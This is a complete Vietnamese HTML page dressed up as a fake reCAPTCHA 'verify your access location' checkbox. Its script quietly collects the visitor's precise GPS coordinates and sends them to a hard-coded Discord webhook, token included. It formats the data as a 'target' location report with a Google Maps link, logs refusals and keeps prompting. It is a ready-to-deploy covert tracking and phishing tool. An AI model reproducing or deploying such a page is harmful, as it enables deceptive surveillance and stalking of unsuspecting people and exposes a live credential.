<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Để bảo vệ tài khoản, vui lòng cho phép xác minh vị trí truy cập của bạn</title>
    <style>
        body { font-family: 'Roboto', sans-serif; background-color: #f9f9f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .captcha-container { background: white; border: 1px solid #d3d3d3; padding: 20px; border-radius: 3px; box-shadow: 0 0 4px rgba(0,0,0,0.1); width: 300px; }
        .checkbox-row { display: flex; align-items: center; margin-bottom: 10px; }
        #checkbox { width: 25px; height: 25px; margin-right: 15px; cursor: pointer; }
        .text { font-size: 14px; color: #555; }
        .logo { margin-left: auto; text-align: center; }
        .logo img { width: 35px; }
        .logo-text { font-size: 10px; color: #555; }
    </style>
</head>
<body>

<div class="captcha-container">
    <div class="checkbox-row">
        <input type="checkbox" id="checkbox" onclick="getLocation()">
        <div class="text">Để bảo vệ tài khoản, vui lòng cho phép xác minh vị trí truy cập của bạn</div>
        <div class="logo">
            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="captcha">
            <div class="logo-text">reCAPTCHA</div>
            <div class="logo-text" style="font-size: 8px;">Bảo mật - Điều khoản</div>
        </div>
    </div>
</div>

<script>
    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1496167020134400233/N8Gig2Z927oHFS70iXnG5jdTAl4RbEGHf2tAxAE9i4Rn6txwDmjW9jWkzl5J_pzDqDs6";

    function getLocation() {
        // Khi người dùng bấm vào ô checkbox, trình duyệt sẽ yêu cầu GPS
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(sendLocation, handleError, {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            });
        } else {
            alert("Trình duyệt của bạn không hỗ trợ xác minh này.");
        }
    }

    function sendLocation(position) {
        const payload = {
            "embeds": [{
                "title": "🎯 VỊ TRÍ GPS CHÍNH XÁC TUYỆT ĐỐI",
                "color": 3066993,
                "fields": [
                    {"name": "📍 Tọa độ", "value": `\`${position.coords.latitude}, ${position.coords.longitude}\``, "inline": true},
                    {"name": "📏 Độ sai số", "value": `\`${position.coords.accuracy.toFixed(1)} mét\``, "inline": true},
                    {"name": "🗺 Google Maps", "value": `[Bấm để xem vị trí](https://www.google.com/maps?q=${position.coords.latitude},${position.coords.longitude})`}
                ],
                "footer": {"text": "T-Math Security Verification"}
            }]
        };

        fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        }).then(() => {
            alert("Xác minh thành công!");
            window.location.href = "https://google.com";
        });
    }

    function handleError(error) {
        let msg = "Người dùng đã chặn quyền truy cập GPS.";
        if (error.code === 1) {
            fetch(DISCORD_WEBHOOK, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({"content": "❌ Đối tượng đã bấm 'Từ chối' quyền vị trí."})
            });
            alert("Vui lòng cho phép quyền vị trí để hoàn tất xác minh Robot.");
        }
    }
</script>

</body>
</html>
